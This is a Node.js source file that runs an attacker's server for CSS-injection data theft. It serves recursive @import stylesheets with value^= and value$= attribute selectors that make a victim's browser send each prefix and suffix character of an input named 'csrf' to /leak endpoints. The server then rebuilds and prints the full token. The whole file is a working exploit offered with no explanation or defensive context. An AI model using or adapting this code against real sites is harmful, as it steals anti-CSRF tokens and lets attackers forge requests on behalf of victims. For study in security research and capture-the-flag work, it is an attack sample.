const http = require('http');
const url = require('url');

const port = 5001;
const HOSTNAME = "http://localhost:5001";
const DEBUG = false;


const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=@-!\#$%&()*+,./:;<=>?[\]^_`{|}~'.split('');
const nbCharsToExfiltrate = 50;

var prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    log('\treq: %s', request.url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/start":
            genResponse(response);
            break;
        case "/leak":
            response.end();
            if (req.query.pre && (!prefix.includes(req.query.pre))) {
               prefix = req.query.pre;
            } else if (req.query.post && (!postfix.includes(req.query.post))) {
               postfix = req.query.post;
            } else {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                log('\tleak: waiting others...');
            }
            break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                log('\tquery: waiting others...');
            }
            break;
        case "/end":
            stop = true;
            console.log('[+] END: %s', req.query.token);
			pending.map(response => response.end());			
        default:
            response.end();
    }
}

const genResponse = (response) => {
    console.log('...pre-payload: ' + prefix);
    console.log('...post-payload: ' + postfix);
	
    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
        characters.map(e => ('input[name=csrf][type=text][value$="' + e + postfix + '"]{--e'+ n +':url(' + HOSTNAME + '/leak?post=' + e + postfix + ')}')).join('') +
        characters.map(e => ('input[name=csrf][type=text][value^="' + prefix + e + '"]{--s'+ n +':url(' + HOSTNAME + '/leak?pre=' + prefix + e +')}')).join('');
	
        if (n == 0) {
			css += 'input[name=csrf][type=text]{ background:' + genCSSCustomProperties() + ';}';
		}
	
        css += 'input[name=csrf][value='+ prefix + postfix + ']{list-style:url(' + HOSTNAME + '/end?token=' + prefix + postfix + ')}';
        css += 'input[name=csrf][value='+ prefix + postfix.slice(1) + ']{list-style:url(' + HOSTNAME + '/end?token=' + prefix + postfix + ')}';
		
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}

function genCSSCustomProperties() {
	properties = [];
	for (i = 0; i < nbCharsToExfiltrate; i++){
		properties.push('var(--s' + i + ', none)');
		properties.push('var(--e'+ i + ', none)');
	}
	return properties.join(',');
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}
